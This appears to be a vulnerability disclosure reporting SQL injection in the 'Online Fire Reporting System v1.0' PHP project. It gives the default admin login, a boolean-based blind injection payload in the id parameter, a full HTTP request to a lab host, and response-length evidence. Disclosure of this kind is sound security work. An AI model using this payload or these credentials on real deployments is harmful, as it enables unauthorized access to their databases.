# Online Fire Reporting System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15346/online-fire-reporting-system-phpoop-free-source-code.html

Vulnerability File: /ofrs/admin/?page=requests/view_request&id=

Vulnerability location: /ofrs/admin/?page=requests/view_request&id=, id

Current database name: ofrs_db,length is 7

[+] Payload: /ofrs/admin/?page=requests/view_request&id=6%27%20or%20length(database())%20=7--+ // Leak place ---> id

```sql
GET /ofrs/admin/?page=requests/view_request&id=6%27%20or%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

When length (database ()) = 6, Content-Length: 30064
![image](https://user-images.githubusercontent.com/54017627/170817278-a3ef7e08-a4da-4a12-ab1f-2fde67b9f44c.png)

![image](https://user-images.githubusercontent.com/54017627/170817288-6cb5b843-1e51-4e42-ab72-18c7584bac00.png)

When length (database ()) = 7, Content-Length: 36340
![image](https://user-images.githubusercontent.com/54017627/170817272-33a433f6-6c0c-47b2-9c02-5eeb9d8f3252.png)

![image](https://user-images.githubusercontent.com/54017627/170817225-915cac8b-a7f1-4f31-9f5c-602ee719fd42.png)
